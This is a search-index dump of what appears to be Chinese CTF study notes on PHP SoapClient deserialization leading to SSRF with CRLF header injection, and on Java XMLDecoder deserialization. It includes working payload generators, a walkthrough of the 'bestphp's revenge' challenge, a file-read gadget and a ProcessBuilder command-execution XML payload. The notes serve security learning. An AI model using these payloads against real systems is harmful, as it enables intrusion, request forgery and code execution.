XXE(\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u6253\u5185\u7f51\uff0c\u4f46\u662f\u6211\u78b0\u5230\u7684\u5f88\u5c11\uff0c\u7b49\u5f85\u540e\u7eed\u8865\u5145)\u3002</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/","title":"SoapClient","text":""},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#_1","title":"\u57fa\u7840","text":"<p>\u8fd9\u4e2a\u7c7b\u5229\u7528\u8d77\u6765\u6bd4\u8f83\u8003\u9a8c\u6280\u5de7\u4e86\uff0c\u800c\u4e14\u7531\u4e8e\u78b0\u5230\u7684\u7f51\u7edc\u73af\u5883\u4e0d\u4f1a\u5f88\u7a33\u5b9a\uff0c\u53ef\u80fd\u8981\u91cd\u590d\u8bd5\u5f88\u591a\u6b21\u624d\u80fd\u8bd5\u51fa\u6765\u3002\u800c\u4e14\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e2a\u7c7b\u7684\u8fd0\u7528\u91cd\u70b9\u4e0d\u5728\u53cd\u5e8f\u5217\u5316\u4e0a\u3002</p> <p><code>SOAP</code>:<code>Simple Object Access Protocol</code>\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae</p> <p>PHP \u7684\u5185\u7f6e\u7c7b SoapClient \u662f\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u8bbf\u95eeweb\u670d\u52a1\u7684\u7c7b\uff0c\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u57fa\u4e8eSOAP\u534f\u8bae\u8bbf\u95eeWeb\u670d\u52a1\u7684 PHP \u5ba2\u6237\u7aef\u3002</p> <p>\u5f00\u542f\u6761\u4ef6\uff1a\u9700\u8981\u5c06php.ini\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6soap.dll\u4e4b\u524d\u7684\u5206\u53f7\u53bb\u6389\u624d\u80fd\u591f\u4f7f\u7528\u3002</p> <pre><code>SoapClient\u00a0{\u00a0/*\u00a0\u65b9\u6cd5\u00a0*/\u00a0public\u00a0__construct\u00a0(\u00a0string|null\u00a0$wsdl\u00a0,\u00a0array\u00a0$options\u00a0=\u00a0[]\u00a0)\u00a0public\u00a0__call\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0array\u00a0$args\u00a0)\u00a0:\u00a0mixed\u00a0public\u00a0__doRequest\u00a0(\u00a0string\u00a0$request\u00a0,\u00a0string\u00a0$location\u00a0,\u00a0string\u00a0$action\u00a0,\u00a0int\u00a0$version\u00a0,\u00a0bool\u00a0$oneWay\u00a0=\u00a0false\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getCookies\u00a0(\u00a0)\u00a0:\u00a0array\u00a0public\u00a0__getFunctions\u00a0(\u00a0)\u00a0:\u00a0array|null\u00a0public\u00a0__getLastRequest\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastRequestHeaders\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastResponse\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastResponseHeaders\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getTypes\u00a0(\u00a0)\u00a0:\u00a0array|null\u00a0public\u00a0__setCookie\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0string|null\u00a0$value\u00a0=\u00a0null\u00a0)\u00a0:\u00a0void\u00a0public\u00a0__setLocation\u00a0(\u00a0string\u00a0$location\u00a0=\u00a0\"\"\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__setSoapHeaders\u00a0(\u00a0SoapHeader|array|null\u00a0$headers\u00a0=\u00a0null\u00a0)\u00a0:\u00a0bool\u00a0public\u00a0__soapCall\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0array\u00a0$args\u00a0,\u00a0array|null\u00a0$options\u00a0=\u00a0null\u00a0,\u00a0SoapHeader|array|null\u00a0$inputHeaders\u00a0=\u00a0null\u00a0,\u00a0array\u00a0&amp;$outputHeaders\u00a0=\u00a0null\u00a0)\u00a0:\u00a0mixed}\n</code></pre> <p>\u6211\u5077\u61d2\u4e86\uff0c\u91cd\u70b9\u5173\u6ce8\u7684\u662f\u8fd9\u91cc\u7684\u7b2c\u4e8c\u884c__call(\u8c03\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u51fd\u6570\uff0c\u4f1a\u53bb\u8c03\u7528<code>__call</code>\u65b9\u6cd5).\u5f53<code>__call</code>\u65b9\u6cd5\u88ab\u89e6\u53d1\u540e\uff0c\u5b83\u53ef\u4ee5\u53d1\u9001 HTTP \u548c HTTPS \u8bf7\u6c42\u3002\u6b63\u662f\u8fd9\u4e2a<code>__call</code>\u65b9\u6cd5\uff0c\u4f7f\u5f97 SoapClient \u7c7b\u53ef\u4ee5\u88ab\u6211\u4eec\u8fd0\u7528\u5728 SSRF \u4e2d\u3002</p> <pre><code>public\u00a0SoapClient\u00a0::\u00a0SoapClient(mixed\u00a0$wsdl\u00a0[\uff0carray\u00a0$options\u00a0])\n</code></pre> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u7528\u6765\u6307\u660e\u662f\u5426\u662fwsdl\u6a21\u5f0f\uff0c\u5c06\u8be5\u503c\u8bbe\u4e3anull\u5219\u8868\u793a\u975ewsdl\u6a21\u5f0f\u3002</li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u5982\u679c\u5728wsdl\u6a21\u5f0f\u4e0b\uff0c\u6b64\u53c2\u6570\u53ef\u9009\uff1b\u5982\u679c\u5728\u975ewsdl\u6a21\u5f0f\u4e0b\uff0c\u5219\u5fc5\u987b\u8bbe\u7f6elocation\u548curi\u9009\u9879\uff0c\u5176\u4e2dlocation\u662f\u8981\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u7684SOAP\u670d\u52a1\u5668\u7684URL\uff0c\u800curi \u662fSOAP\u670d\u52a1\u7684\u76ee\u6807\u547d\u540d\u7a7a\u95f4\u3002</li> </ul> <p>SOAP\u662fwebService\u4e09\u8981\u7d20\uff08SOAP\u3001WSDL\u3001UDDI\uff09\u4e4b\u4e00\uff1a</p> <p>WSDL \u7528\u6765\u63cf\u8ff0\u5982\u4f55\u8bbf\u95ee\u5177\u4f53\u7684\u63a5\u53e3\u3002</p> <p>UDDI\u7528\u6765\u7ba1\u7406\uff0c\u5206\u53d1\uff0c\u67e5\u8be2webService\u3002</p> <p>SOAP\uff08\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u8fde\u63a5\u6216Web\u670d\u52a1\u6216\u5ba2\u6237\u7aef\u548cWeb\u670d\u52a1\u4e4b\u95f4\u7684\u63a5\u53e3\u3002</p> <p>\u5176\u91c7\u7528HTTP\u4f5c\u4e3a\u5e95\u5c42\u901a\u8baf\u534f\u8bae\uff0cXML\u4f5c\u4e3a\u6570\u636e\u4f20\u9001\u7684\u683c\u5f0f\u3002\uff08\u770b\u4e0d\u61c2\u95ee\u9898\u4e5f\u4e0d\u5927\uff09</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#crlf","title":"CRLF\u6ce8\u5165\u653b\u51fb(\u670d\u52a1\u5668\u54cd\u5e94\u62c6\u5206\u6f0f\u6d1e)","text":"<p>CRLF\u662f\u201d\u56de\u8f66 + \u6362\u884c\u201d(\\r\\n)\u7684\u7b80\u79f0\u3002\u5728HTTP\u534f\u8bae\u4e2d\uff0cHTTP Header\u4e0eHTTP Body\u662f\u7528\u4e24\u4e2aCRLF\u5206\u9694\u7684\uff0c\u6d4f\u89c8\u5668\u5c31\u662f\u6839\u636e\u8fd9\u4e24\u4e2aCRLF\u6765\u53d6\u51faHTTP \u5185\u5bb9\u5e76\u663e\u793a\u51fa\u6765\u3002\u6240\u4ee5\uff0c\u4e00\u65e6\u6211\u4eec\u80fd\u591f\u63a7\u5236HTTP \u6d88\u606f\u5934\u4e2d\u7684\u5b57\u7b26\uff0c\u6ce8\u5165\u4e00\u4e9b\u6076\u610f\u7684\u6362\u884c\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u6ce8\u5165\u4e00\u4e9b\u4f1a\u8bddCookie\u6216\u8005HTML\u4ee3\u7801\uff0c\u6240\u4ee5CRLFInjection\u53c8\u53ebHTTP Response Splitting\uff0c\u7b80\u79f0HRS\u3002</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#ssrfcrlf","title":"SSRF+CRLF\u653b\u51fb\u5185\u7f51","text":"<p>\u5b9e\u9645\u4e0a\u5f88\u591a\u65f6\u5019\u90fd\u9700\u8981\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u914d\u5408\u5728\u4e00\u8d77\u4f7f\u7528\uff0c\u5f53\u6211\u4eec\u6211\u4eec\u53ef\u4ee5\u4ece\u5916\u7f51\u8c03\u7528\u5230soap\u7684api\uff0c\u800c\u653b\u51fb\u76ee\u6807\u662f\u5728\u5185\u7f51\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5229\u7528SoapClient\u8fdb\u884cSSRF\u653b\u51fb\u5185\u7f51\uff0c\u7136\u540e\u914d\u5408CRLF\u6784\u9020POST\u8bf7\u6c42\u589e\u52a0\u6211\u4eec\u7684\u653b\u51fb\u9762\u3002</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f1a\u6709CRLF:</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230options\u53c2\u6570\u4e2d\u8fd8\u6709\u4e00\u4e2a\u9009\u9879\u4e3auser_agent\uff0c\u8fd0\u884c\u6211\u4eec\u81ea\u5df1\u8bbe\u7f6eUser-Agent\u7684\u503c\u3002</p> <p>\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236User-Agent\u7684\u503c\u65f6\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u6784\u9020\u4e00\u4e2aPOST\u8bf7\u6c42\uff0c\u56e0\u4e3aContent-Type\u4e3a\u548cContent-Length\u90fd\u5728User-Agent\u4e4b\u4e0b\uff0c\u800c\u63a7\u5236\u8fd9\u4e24\u4e2a\u662f\u5229\u7528CRLF\u53d1\u9001post\u8bf7\u6c42\u6700\u5173\u952e\u7684\u5730\u65b9\u3002</p> <p>\u751f\u6210\u4efb\u610fPOST\u62a5\u6587\u7684POC:</p> <pre><code>&lt;?php\n$target = 'http://123.206.216.198/bbb.php';\n$post_string = 'a=b&amp;flag=aaa';\n$headers = array(\n    'X-Forwarded-For: 127.0.0.1',\n    'Cookie: xxxx=1234'\n    );\n$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      =&gt; \"aaab\"));\n$aaa = serialize($b)\uff1b\n$aaa = str_replace('^^','%0d%0a',$aaa);\n$aaa = str_replace('&amp;','%26',$aaa);\necho $aaa;\n?&gt;\n</code></pre> <p>\u8fd9\u4e2a\u662f\u67d0\u4e2a\u9996\u6b21\u53d1\u73b0\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u4eba\u6240\u5199\u7684\u811a\u672c\u3002\u53ef\u4ee5\u7406\u89e3\u4e3a\u5c06\u6570\u636e\u5305\u8fdb\u884c\u4f2a\u9020\uff0c\u800c\u4e14\u7531\u4e8e\u6211\u4eec\u6709CRLF\uff0c\u6211\u4eec\u80fd\u5c06\u8fd9\u4e2a\u6570\u636e\u5305\u9020\u7684\u66f4\u4e3a\u201d\u903c\u771f\u201c\uff0c\u5426\u5219\u4ec5\u6709SSRF\u7684\u8bdd\uff0c\u8fd9\u4e2a\u5305\u4f1a\u6781\u5927\u7684\u53d7\u9650\u5236\u4e8eHTTP/HTTPS\u534f\u8bae\u3002\uff08\u5982\u679c\u4f60\u4ed4\u7ec6\u770b\u8fd9\u4e2a\u811a\u672c\uff0c\u4f1a\u53d1\u73b0\u5b83\u8fd8\u633a\u6709\u610f\u601d\u7684\uff09</p> <p>\u5bf9\u4e8e\u5982\u4f55\u53d1\u9001POST\u7684\u6570\u636e\u5305\uff0c\u8fd9\u91cc\u9762\u8fd8\u6709\u4e00\u4e2a\u5751\uff0c\u5c31\u662f<code>Content-Type</code>\u7684\u8bbe\u7f6e\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u63d0\u4ea4\u7684\u662fPOST\u6570\u636e<code>Content-Type</code>\u7684\u503c\u6211\u4eec\u8981\u8bbe\u7f6e\u4e3a<code>application/x-www-form-urlencoded</code>\uff0c\u8fd9\u91cc\u5982\u4f55\u4fee\u6539<code>Content-Type</code>\u7684\u503c\u5462\uff1f\u7531\u4e8e<code>Content-Type</code>\u5728<code>User-Agent</code>\u7684\u4e0b\u9762\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>SoapClient</code>\u6765\u8bbe\u7f6e<code>User-Agent</code>\uff0c\u5c06\u539f\u6765\u7684<code>Content-Type</code>\u6324\u4e0b\u53bb\uff0c\u4ece\u800c\u518d\u63d2\u5165\u4e00\u4e2a\u65b0\u7684<code>Content-Type</code>\u3002(\u4e0a\u9762\u7684\u811a\u672c\u5df2\u7ecf\u5e2e\u4f60\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898)</p> <p>\u4e0b\u9762\u7684\u5b50\u6587\u6863\u662f\u4e00\u9053\u4f8b\u9898\u3002</p>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#bestphps-revenge","title":"bestphp's revenge","text":"<p>\u8fd9\u4e2a\u662f\u4e00\u9053\u9898\u76ee\uff0c\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u4f46\u662f\u6211\u4e0d\u8bb0\u5f97\u5728\u54ea\u590d\u73b0\u4e86\uff0c\u5c31copy\u4e86</p> <p>\u6e90\u7801\uff1a</p> <p></p> <p></p> <p>\u5f53REMOTE_ADDR\u7b49\u4e8e127.0.0.1\u65f6\uff0c\u5c31\u4f1a\u5728session\u4e2d\u63d2\u5165flag\uff0c\u5c31\u80fd\u5f97\u5230flag\u3002</p> <p>\u4f46\u662f\u8fd9\u91cc\u5e76\u6ca1\u6709\u660e\u663e\u7684ssrf\u5229\u7528\u70b9\uff0c\u6240\u4ee5\u6211\u4eec\u60f3\u5230\u5229\u7528PHP\u539f\u751f\u7c7bSoapClient\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4SSRF\u3002\u5e76\u4e14\uff0c\u7531\u4e8eflag\u4f1a\u88ab\u63d2\u5165\u5230session\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4e00\u5b9a\u9700\u8981\u643a\u5e26\u4e00\u4e2acookie\u5373PHPSESSID\u53bb\u8bbf\u95ee\u5b83\u6765\u751f\u6210\u8fd9\u4e2asession\u6587\u4ef6\u3002</p> <p>session\u7b80\u5355\u7684\u7406\u89e3\u5c31\u662f\u670d\u52a1\u5668\u7684cookie</p> <p>\u7136\u540e\uff0c\u6211\u4eec\u5c31\u8981\u60f3\u529e\u6cd5\u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u4f46\u8fd9\u91cc\u6709\u6ca1\u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u90a3\u4e48\u6211\u4eec\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u5728\u9898\u76ee\u6e90\u7801\u4e2d\u53d1\u73b0\u4e86session_start();\uff0c\u5f88\u660e\u663e\uff0c\u6211\u4eec\u53ef\u4ee5\u7528session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6211\u4eec\u5fc5\u987b\u8981\u6709<code>ini_set()</code>\u8fd9\u4e2a\u51fd\u6570\u6765\u66f4\u6539<code>session.serialize_handler</code>\u7684\u503c\uff0c\u5c06session\u53cd\u5e8f\u5217\u5316\u5f15\u64ce\u4fee\u6539\u4e3a\u5176\u4ed6\u7684\u5f15\u64ce\uff0c\u672c\u6765\u5e94\u8be5\u4f7f\u7528ini_set()\u8fd9\u4e2a\u51fd\u6570\u7684\uff0c\u4f46\u662f\u8fd9\u4e2a\u51fd\u6570\u4e0d\u63a5\u53d7\u6570\u7ec4\uff0c\u6240\u4ee5\u5c31\u4e0d\u884c\u4e86\u3002\u4e8e\u662f\u6211\u4eec\u5c31\u7528session_start()\u51fd\u6570\u6765\u4ee3\u66ff\uff0c\u5373\u6784\u9020<code>session_start(serialize_handler=php_serialize)</code>\u5c31\u884c\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u9898\u76ee\u4e2d\u7684<code>call_user_func($_GET['f'], $_POST);</code>\u51fd\u6570\uff0c\u4f20\u5165GET\uff1a/?f=session_start\u3001POST\uff1aserialize_handler=php_serialize\uff0c\u5b9e\u73b0<code>session_start(serialize_handler=php_serialize)</code>\u7684\u8c03\u7528\u6765\u4fee\u6539\u6b64\u9875\u9762\u7684\u5e8f\u5217\u5316\u5f15\u64ce\u4e3aphp_serialize\u3002</p> <p>(\u8fd9\u91ccsession\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\u4f1a\u63d0\u53ca)</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u7b2c\u4e00\u6b21\u4f20\u503c\u5148\u6ce8\u5165\u4e0a\u9762POC\u751f\u6210\u7684payload\u521b\u5efa\u5e76\u5f97\u5230\u6211\u4eec\u7684session\uff1a</p> <p></p> <p></p> <p>\u6b64\u65f6\uff0c\u6211\u4eec\u6210\u529f\u5c06\u6211\u4eecphp\u539f\u751f\u7c7bSoapClient\u6784\u9020\u7684payload\u4f20\u5165\u4e86<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\u7684session\u4e2d\uff0c\u5f53\u9875\u9762\u91cd\u65b0\u52a0\u8f7d\u65f6\uff0c\u5c31\u4f1a\u81ea\u52a8\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u3002\u4f46\u6b64\u65f6\u8fd8\u4e0d\u4f1a\u89e6\u53d1SSRF\uff0c\u9700\u8981\u89e6\u53d1<code>__call</code>\u65b9\u6cd5\u6765\u9020\u6210SSRF\uff0c\u8be5\u65b9\u6cd5\u5728\u8bbf\u95ee\u5bf9\u8c61\u4e2d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\uff0c\u6240\u4ee5\u5355\u7eaf\u53cd\u5e8f\u5217\u5316\u8fd8\u4e0d\u884c\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u8bbf\u95ee\u8be5\u5bf9\u8c61\u4e2d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u8fd9\u91cc\u5c31\u7528\u5230\u4e86\u5982\u4e0b\u8fd9\u6bb5\u4ee3\u7801\uff1a</p> <pre><code>$a\u00a0=\u00a0array(reset($_SESSION),\u00a0'welcome_to_the_lctf2018');call_user_func($b,\u00a0$a);\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528extract\u51fd\u6570\u5c06\u53d8\u91cfb\u8986\u76d6\u4e3acall_user_func\uff0c\u8fd9\u6837\uff0c\u5c31\u6210\u4e86\uff1a</p> <pre><code>call_user_func(call_user_func,\u00a0array(reset($_SESSION),\u00a0'welcome_to_the_lctf2018'));\n</code></pre> <p>call_user_func()\u51fd\u6570\u6709\u4e00\u4e2a\u7279\u6027\uff0c\u5c31\u662f\u5f53\u53ea\u4f20\u5165\u4e00\u4e2a\u6570\u7ec4\u65f6\uff0c\u53ef\u4ee5\u7528call_user_func()\u6765\u8c03\u7528\u4e00\u4e2a\u7c7b\u91cc\u9762\u7684\u65b9\u6cd5\uff0ccall_user_func()\u4f1a\u5c06\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u503c\u5f53\u505a\u7c7b\u540d\uff0c\u7b2c\u4e8c\u4e2a\u503c\u5f53\u505a\u65b9\u6cd5\u540d\u3002</p> <p>\u8fd9\u6837\u4e5f\u5c31\u662f\u4f1a\u8bbf\u95ee\u6211\u4eec\u6784\u9020\u7684session\u5bf9\u8c61\u4e2d\u7684welcome_to_the_lctf2018\u65b9\u6cd5\uff0c\u800cwelcome_to_the_lctf2018\u65b9\u6cd5\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u89e6\u53d1<code>__call</code>\u65b9\u6cd5\uff0c\u9020\u6210ssrf\u53bb\u8bbf\u95eeflag.php\u3002</p> <p>\u7b2c\u4e8c\u6b21\u4f20\u53c2\uff1a</p> <p></p> <p></p> <p>\u6700\u540e\uff0c\u6211\u4eec\u7b2c\u4e09\u6b21\u4f20\u53c2\uff0c\u7528\u6211\u4eecPOC\u91cc\u9762\u81ea\u5df1\u8bbe\u7f6e\u7684cookie\uff08<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\uff09\u53bb\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\uff0c<code>var_dump($_SESSION);</code>\u4f1a\u5c06<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\u7684\u8fd9\u4e2asession\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff0c\u5373\u53ef\u5f97\u5230flag\uff1a</p> <p></p> <p>\u6240\u4ee5\u6700\u540e\u7684payload:</p> <pre><code>&lt;?php$target = \"http://127.0.0.1/flag.php\";$attack = new SoapClient(null,array('location' =&gt; $target,'user_agent' =&gt; \"N0rth3ty\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\\r\\n\",    'uri' =&gt; \"123\"));$payload = urlencode(serialize($attack));echo $payload;?&gt;\n</code></pre>"},{"location":"web_bak/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/else/","title":"\u5176\u4ed6","text":"<p>\u8fd9\u91cc\u4e00\u822c\u7528\u6765\u5199\u4e00\u4e9b\u7528\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\u7684\u7c7b\uff0c\u53ef\u4ee5\u81ea\u5df1\u6dfb\u52a0\u3002</p> <p>DirectoryIterator   \u904d\u5386\u76ee\u5f55</p> <p>FilesystemIterator  \u904d\u5386\u76ee\u5f55</p> <p>GlobIterator  \u904d\u5386\u76ee\u5f55\uff0c\u4f46\u662f\u4e0d\u540c\u7684\u70b9\u5728\u4e8e\u5b83\u53ef\u4ee5\u901a\u914d\u4f8b\u5982/var/html/www/flag*</p> <p>SplFileObject  \u8bfb\u53d6\u6587\u4ef6\uff0c\u6309\u884c\u8bfb\u53d6\uff0c\u591a\u884c\u9700\u8981\u904d\u5386</p> <p>finfo/finfo_open()\u9700\u8981\u4e24\u4e2a\u53c2\u6570</p> <p>\u8fd9\u662f\u90a3\u5929DASCTF&amp;MAR\u4e2d\u7684\u53cd\u5e8f\u5217\u5316\u5b66\u5230\u7684\u4e1c\u897f\u3002\u8fd9\u91cc\u5c31\u6709\u7c7b\u6765\u8bfb\u53d6\u6587\u4ef6\u4e86\u3002</p> <pre><code>&lt;?phpclass A{   public $class='SplFileObject';    public $para='/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php';}echo serialize(new A());\nPHP\n</code></pre>"},{"location":"web_bak/serialize/java/xmldecoder/","title":"Xmldecoder","text":"<p>XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <p>\u5b8c\u5168\u4e0d\u4f1a\u5462\uff08\u6307JAVA,XML\u548c\u9898\u76ee\uff09</p> <p>\u4f46\u4e0d\u4f1a\u53ef\u4ee5\u5148\u6765\u590d\u73b0\u3002\u4f7f\u7528\u7684\u5de5\u5177\u662fintelliJ IDEA</p> <p>\u6f0f\u6d1e\u6d41\u7a0b\u6765\u81eahttps://www.cnblogs.com/hetianlab/p/13534535.html</p> <pre><code>package packge;\nimport java.beans.XMLEncoder;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\n\npublic class Test {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();\n        map.put(\"123\",\"aaaa\");\n        map.put(\"321\",new ArrayList&lt;&gt;());\n        XMLEncoder xmlEncoder = new XMLEncoder(System.out);\n        xmlEncoder.writeObject(map);\n        xmlEncoder.close();\n    }\n}\n</code></pre> <p></p> <p>\u6211\u4eec\u501f\u52a9PHP\u7684\u53cd\u5e8f\u5217\u5316\u6765\u5b66\u4e60\uff0c\u8fd9\u91cc\u7684Encoder\u76f8\u5f53\u4e8eserilize\uff0c\u800c\u63a5\u4e0b\u6765\u6240\u4f7f\u7528\u5230\u7684Decoder\u76f8\u5f53\u4e8eunserilize</p> <p>\u4f5c\u7528\u6548\u679c\u662f\u5c06map\uff08Map \u63d0\u4f9b\u4e86\u4e00\u4e2a\u66f4\u901a\u7528\u7684\u5143\u7d20\u5b58\u50a8\u65b9\u6cd5\u3002Map \u96c6\u5408\u7c7b\u7528\u4e8e\u5b58\u50a8\u5143\u7d20\u5bf9\uff08\u79f0\u4f5c\u201c\u952e\u201d\u548c\u201c\u503c\u201d\uff09\uff0c\u5176\u4e2d\u6bcf\u4e2a\u952e\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u3002\u4ece\u6982\u5ff5\u4e0a\u800c\u8a00\uff0c\u60a8\u53ef\u4ee5\u5c06  List \u770b\u4f5c\u662f\u5177\u6709\u6570\u503c\u952e\u7684 Map\u3002\u800c\u5b9e\u9645\u4e0a\uff0c\u9664\u4e86 List \u548c Map \u90fd\u5728\u5b9a\u4e49 java.util  \u4e2d\u5916\uff0c\u4e24\u8005\u5e76\u6ca1\u6709\u76f4\u63a5\u7684\u8054\u7cfb\u3002\u672c\u6587\u5c06\u7740\u91cd\u4ecb\u7ecd\u6838\u5fc3 Java \u53d1\u884c\u5957\u4ef6\u4e2d\u9644\u5e26\u7684 Map\uff0c\u540c\u65f6\u8fd8\u5c06\u4ecb\u7ecd\u5982\u4f55\u91c7\u7528\u6216\u5b9e\u73b0\u66f4\u9002\u7528\u4e8e\u60a8\u5e94\u7528\u7a0b\u5e8f\u7279\u5b9a\u6570\u636e\u7684\u4e13\u7528  Map\u3002\uff09</p> <p>\u4e2d\u7684\u952e\u503c\u5b58\u50a8\u5230XML\u6587\u672c\u91cc\uff08\uff1f\uff09</p> <pre><code>package packge;\nimport java.beans.XMLDecoder;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.io.StringBufferInputStream;\npublic class Test {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        String s = \"&lt;java version=\\\"1.8.0_131\\\" class=\\\"java.beans.XMLDecoder\\\"&gt;\\n\" +\n                \" &lt;object class=\\\"java.util.HashMap\\\"&gt;\\n\" +\n                \"  &lt;void method=\\\"put\\\"&gt;\\n\" +\n                \"   &lt;string&gt;123&lt;/string&gt;\\n\" +\n                \"   &lt;string&gt;aaaa&lt;/string&gt;\\n\" +\n                \"  &lt;/void&gt;\\n\" +\n                \"  &lt;void method=\\\"put\\\"&gt;\\n\" +\n                \"   &lt;string&gt;321&lt;/string&gt;\\n\" +\n                \"   &lt;object class=\\\"java.util.ArrayList\\\"/&gt;\\n\" +\n                \"  &lt;/void&gt;\\n\" +\n                \" &lt;/object&gt;\\n\" +\n                \"&lt;/java&gt;\";\n        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);\n        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);\n        Object o = xmlDecoder.readObject();\n        System.out.println(o);\n    }\n}\n</code></pre> <p></p> <p>\u5c06XML\u4e2d\u7684MAP\u5bf9\u8c61\u63d0\u53d6\u4e86\u51fa\u6765</p> <p>\u5982\u679c\u5bf9xml\u6570\u636e\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a\u6267\u884c\u547d\u4ee4\u7684\u6570\u636e</p> <pre><code>&lt;java version=\"1.7.0_80\" class=\"java.beans.XMLDecoder\"&gt;\n &lt;object class=\"java.lang.ProcessBuilder\"&gt;\n  &lt;array class=\"java.lang.String\" length=\"1\"&gt;\n    &lt;void index=\"0\"&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;\n  &lt;/array&gt;\n  &lt;void method=\"start\"&gt;&lt;/void&gt;\n &lt;/object&gt;\n&lt;/java&gt;\n</code></pre> <p>\u7a0d\u5fae\u4fee\u6539\u9a8c\u8bc1\u4e00\u4e0b\uff1a</p> <p>\u8f93\u51fa\u4e3a</p> <pre><code>java.lang.ProcessBuilder@5e265ba4\n</code></pre> <p>\u5e76\u4e14\u6210\u529f\u6253\u5f00\u4e86\u6211\u7684\u8ba1\u7b97\u5668</p> 